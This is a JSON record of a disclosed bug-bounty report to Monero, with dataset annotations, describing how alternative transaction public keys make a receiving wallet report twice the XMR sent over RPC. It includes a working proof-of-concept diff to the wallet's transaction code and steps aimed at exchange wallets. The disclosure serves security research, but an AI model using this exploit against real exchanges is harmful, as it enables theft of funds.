{
  "reported_to": "Monero",
  "reported_by": "phiren ",
  "title": "Attcker can trick monero wallet into reporting it recived twice as much with alternative tx_keypubs",
  "content": "\nSummary: multiple identical tx_pub_keys were patched, but you can still use alternative tx_pub_keys to get the same result.\nDescription: An attacker can craft an XMR transaction which causes the receiving wallet to report that it received twice as much XMR as the attacker actually sent.\nThe balance of the wallet isn't effected, so a personal user probably won't be ticked, however the doubled amount is reported over the get_transfers RPC call.\nThis is especially devastating for automated wallets, such as cryptocurrency exchanges that rely on RPC calls returning the correct result.\nThis attack is a slight modification of the previous flaw that was patched in pull request 3985. That flaw allows unlimited multiplication of funds, instead of just a 2x multiplication that this attack allows.\nThis attack leverages the alternative tx_pub_keys feature introduced with subaddresses. extra data is arranged so it contains:\nA dummy tx_pub_key\nAn array of alternative tx_pub_keys entries all containing the legitimate txkey for each output.\nThe legitimate tx_pub_key\nThe process_new_transaction function will:\nGrab the dummy tx_pub_key\nGrab the array of alternative tx_pub_keys\nScan all the outputs with both the dummy and alternative tx_pub_keys. Which will match on the legitimate tx_pub_keys.\nLoop back to the start, grab the legitimate tx_pub_key\nSince the alternative keys were not added into the public_keys_seen set, it scans all the outputs again.\nHacked.\nReleases Affected:\nMonero master ebf2818ab5f42b10745cb99d07920f3197c3d914\nMonero 0.12.3.0 release tag\nProbably any Monero release since subaddresses were introduced\nSteps To Reproduce:\nOn the attacking wallet, Patch cryptonote_tx_utils.cpp\nCode 1.97 KiB\n1    diff --git a/src/cryptonote_core/cryptonote_tx_utils.cpp b/src/cryptonote_core/cryptonote_tx_utils.cpp\n2    index 071ce591..3835690a 100644\n3    --- a/src/cryptonote_core/cryptonote_tx_utils.cpp\n4    +++ b/src/cryptonote_core/cryptonote_tx_utils.cpp\n5    @@ -351,9 +351,15 @@ namespace cryptonote\n6           txkey_pub = rct::rct2pk(hwdev.scalarmultBase(rct::sk2rct(tx_key)));\n7         }\n8         remove_field_from_tx_extra(tx.extra, typeid(tx_extra_pub_key));\n9    -    add_tx_pub_key_to_extra(tx, txkey_pub);\n10    +    crypto::public_key dummy_key;\n11    +    add_tx_pub_key_to_extra(tx, dummy_key);\n12    \n13         std::vector<crypto::public_key> additional_tx_public_keys;\n14    +    for (size_t i = 0; i < destinations.size(); i++)\n15    +      additional_tx_public_keys.push_back(txkey_pub); // One for each output.\n16    +\n17    +    add_additional_tx_pub_keys_to_extra(tx.extra, additional_tx_public_keys);\n18    +    add_tx_pub_key_to_extra(tx, txkey_pub);\n19    \n20         // we don't need to include additional tx keys if:\n21         //   - all the destinations are standard addresses\n22    @@ -421,9 +427,9 @@ namespace cryptonote\n23           output_index++;\n24           summary_outs_money += dst_entr.amount;\n25         }\n26    -    CHECK_AND_ASSERT_MES(additional_tx_public_keys.size() == additional_tx_keys.size(), false, \"Internal error creating additional public keys\");\n27    +    //CHECK_AND_ASSERT_MES(additional_tx_public_keys.size() == additional_tx_keys.size(), false, \"Internal error creating additional public keys\");\n28    \n29    -    remove_field_from_tx_extra(tx.extra, typeid(tx_extra_additional_pub_keys));\n30    +    //remove_field_from_tx_extra(tx.extra, typeid(tx_extra_additional_pub_keys));\n31    \n32         LOG_PRINT_L2(\"tx pubkey: \" << txkey_pub);\n33         if (need_additional_txkeys)\n34\n35  2\\. Compile wallet\n36  3\\. Do a regular transfer to an exchange wallet.\n37  4\\. Profit.\n38\n39## Impact\n40\n41By depositing and withdrawing the same coins, doubling each time; The attacker could eventually steal all XMR from an exchange hotwallet.\n\n",
  "severity": [
    8.2,
    null
  ],
  "bounty": 35,
  "weaknesses": [
    "Business Logic Errors"
  ],
  "screenshots": {},
  "disclosed_date": 1532741280,
  "report_url": "https://hackerone.com/reports/379049",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Patch cryptonote_tx_utils.cpp to modify transaction key handling as described in the diff"
    ],
    [
      2,
      "Compile the modified wallet and perform a regular transfer to an exchange wallet to trigger the double-reporting bug"
    ]
  ],
  "vuln_description": "An attacker can craft a Monero transaction that causes the receiving wallet to report receiving twice the actual amount sent. This is achieved by manipulating alternative tx_pub_keys in a way that makes the wallet scan outputs twice - once with a dummy key and once with the legitimate key. While the wallet balance isn't actually affected, the inflated amount appears in RPC calls (like get_transfers), which could be exploited against automated systems like exchanges.",
  "reason": "This vulnerability requires deep understanding of Monero's transaction structure, particularly the subaddress and alternative tx_pub_keys implementation. The attacker needs to recognize how the wallet processes multiple tx_pub_keys and how to manipulate this process without triggering validation checks. The interaction between dummy keys, alternative keys, and the legitimate key in the scanning process is subtle and non-obvious.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}